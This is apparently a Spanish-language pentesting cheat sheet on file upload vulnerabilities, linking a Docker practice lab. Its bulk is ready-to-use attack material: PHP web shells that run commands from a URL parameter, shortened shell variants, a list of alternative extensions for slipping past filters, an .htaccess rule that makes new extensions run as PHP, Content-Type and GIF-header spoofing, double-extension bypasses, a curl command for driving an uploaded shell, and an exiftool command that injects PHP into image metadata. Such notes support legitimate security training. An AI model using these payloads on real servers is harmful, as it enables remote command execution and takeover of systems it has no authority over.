_____________________________

El abuso de subidas de archivos es un tipo de ataque que se produce cuando un atacante aprovecha las vulnerabilidades en las aplicaciones web que permiten a los usuarios **cargar archivos** en el servidor. Este tipo de ataque se conoce comúnmente como un ataque de “**subida de archivos maliciosos**“.

En un ataque de subida de archivos maliciosos, un atacante carga un archivo malicioso en una aplicación web, que luego se almacena en el servidor. Si por ejemplo el atacante consigue subir un archivo PHP y el servidor web lo almacena, podría conseguir ejecución remota de comandos y tomar el control del servidor.

Los atacantes también pueden utilizar técnicas de “**falsificación de tipos de archivos**” para engañar a una aplicación web con el objetivo de que acepte un archivo malicioso como si fuera un archivo legítimo.

_________________________

Lab. de practica

[File Upload Laboratory](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)

```bash
git clone https://github.com/moeinfatehi/file_upload_vulnerability_scenarios
cd file_upload_vulnerability_scenarios
docker-compose up -d
```

_____________________________

**EXTENSION RESTRICTION**

archivo malicioso PHP 

```php
<?php
	system($_GET['cmd']);
?>
```

extensiones PHP alternativas para bypass

_.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, _.phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_

incluir una extensión nueva para que interprete **php** con **.htaccess**

archivo de texto con nombre .htaccess

```
AddType application/x-httpd-php <.extensión>
```

**.extensión** = extensión a crear

**Content-Type: text/plain**

_________________

**SIZE RESTRICTION**

probar acortar la cantidad de caracteres

```php
<?php system($_GET[0]);?>
```

```php
<?=`$_GET[0]`?>
```

____________________________

**FILE TYPE RESTRICTION**

verificar content type y cambiarlo al archivo correspondiente

**Content-Type: image/jpg**

cambiar los primeros bytes del archivo para hacer creer que es un archivo diferente 

```php
GIF8;
<?php system($_GET[0]);?>
```

____________________

**NAME CHANGE BYPASS**

Es posible que se modifique el nombre del archivo a algún tipo de hash

solo el nombre, nombre mas extensión, todo el contenido.

[Hash Examples](https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401)

_______________________

**NAME CONTAIN EXTENTION**

Es posible que al subir el archivo se valide que este contenga el nombre de la extensión se puede bypassear de la siguiente forma

```
nombrearchivo.<extensión necesaria>.<extensión maliciosa>
```

extensión necesaria = colocar extensión solicitada por la web

extensión maliciosa = colocar la extensión de nuestro script

__________________________

**CURL**

en caso que aplique una descarga automática al abrir ruta del archivo tramitar la data por **curl** de la siguiente manera

```bash
curl -s -X GET "<url>" -G --data-urlencode "<parametro>=<comando>"
```

______________________________

Inyectar metadatos a imágenes o archivos

```bash
exiftool -Comment='<?php system("id"); ?>' <nombre_imagen>
```


